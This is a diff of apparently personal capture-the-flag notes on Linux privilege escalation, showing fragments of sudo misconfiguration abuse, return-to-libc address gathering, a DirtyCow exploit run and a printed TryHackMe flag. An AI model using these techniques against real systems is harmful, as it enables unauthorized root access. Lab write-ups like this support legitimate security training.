@@ -18,20 +18,20 @@ Running `sudo -l` returns a few options of things we can run so we will find a w
 ```bash
 TCM@debian:~$ sudo -l
 Matching Defaults entries for TCM on this host:
-    env_reset, env_keep+=LD_PRELOAD
+		env_reset, env_keep+=LD_PRELOAD
 
 User TCM may run the following commands on this host:
-    (root) NOPASSWD: /usr/sbin/iftop
-    (root) NOPASSWD: /usr/bin/find
-    (root) NOPASSWD: /usr/bin/nano
-    (root) NOPASSWD: /usr/bin/vim
-    (root) NOPASSWD: /usr/bin/man
-    (root) NOPASSWD: /usr/bin/awk
-    (root) NOPASSWD: /usr/bin/less
-    (root) NOPASSWD: /usr/bin/ftp
-    (root) NOPASSWD: /usr/bin/nmap
-    (root) NOPASSWD: /usr/sbin/apache2
-    (root) NOPASSWD: /bin/more
+		(root) NOPASSWD: /usr/sbin/iftop
+		(root) NOPASSWD: /usr/bin/find
+		(root) NOPASSWD: /usr/bin/nano
+		(root) NOPASSWD: /usr/bin/vim
+		(root) NOPASSWD: /usr/bin/man
+		(root) NOPASSWD: /usr/bin/awk
+		(root) NOPASSWD: /usr/bin/less
+		(root) NOPASSWD: /usr/bin/ftp
+		(root) NOPASSWD: /usr/bin/nmap
+		(root) NOPASSWD: /usr/sbin/apache2
+		(root) NOPASSWD: /bin/more
 
 ```
 #### Exploiting file as sudo:
@@ -130,10 +130,10 @@ root
 kay@basic2:~$ sudo -l
 [sudo] password for kay:
 Matching Defaults entries for kay on basic2:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+		env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
 User kay may run the following commands on basic2:
-    (ALL : ALL) ALL
+		(ALL : ALL) ALL
 kay@basic2:~$ sudo su root
 root@basic2:/home/kay# whoami
 root
@@ -147,10 +147,10 @@ We run `sudo -l` as always when we are trying to priv esc to see if we can run a
 ```bash
 joanna@openadmin:~$ sudo -l
 Matching Defaults entries for joanna on openadmin:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+		env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
 User joanna may run the following commands on openadmin:
-    (ALL) NOPASSWD: /bin/nano /opt/priv
+		(ALL) NOPASSWD: /bin/nano /opt/priv
 ```
 
 In fact we can run something, we can use the text editor nano as root on teh file /opt/priv
@@ -186,11 +186,11 @@ root.txt: not found
 www-data@THM-Chal:/home/itguy$ sudo -l
 sudo -l
 Matching Defaults entries for www-data on THM-Chal:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+		env_reset, mail_badpass,
+		secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
 User www-data may run the following commands on THM-Chal:
-    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
+		(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
 ```
 
 After checking the file `backup.pl` we can see that it is running this:
@@ -223,6 +223,10 @@ uid=0(root) gid=0(root) groups=0(root)
 # cat root.txt
 THM{6637f41d0177b6f37cb20d775124699f}
 ```
+## tryhackme linux privlege escalation arena()80 different SUID binaries(80 different priv esc methods):
+
+
+## Other
 
 ## Priv esc with mounting file system on docker:
 
@@ -428,9 +432,9 @@ This shows us that the buffer overflows at 52 chars
 Now we need to get all the addresses so we will start with finding the /bin/sh in libc
 ```bash
 www-data@frolic:/home/ayush/.binary$ ldd rop
-        linux-gate.so.1 =>  (0xb7fda000)
-        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e19000)
-        /lib/ld-linux.so.2 (0xb7fdb000)
+				linux-gate.so.1 =>  (0xb7fda000)
+				libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e19000)
+				/lib/ld-linux.so.2 (0xb7fdb000)
 
 www-data@frolic:/home/ayush/.binary$ strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
  15ba0b /bin/sh
@@ -538,12 +542,12 @@ we can test to see if the kernel for that machine is vulnrable by running an exp
 ```bash
 TCM@debian:~$ ./c0w
 
-   (___)
-   (o o)_____/
-    @@ `     \
-     \ ____, //usr/bin/passwd
-     //    //
-    ^^    ^^
+	 (___)
+	 (o o)_____/
+		@@ `     \
+		 \ ____, //usr/bin/passwd
+		 //    //
+		^^    ^^
 DirtyCow root privilege escalation
 Backing up /usr/bin/passwd to /tmp/bak
 mmap 9ca4000
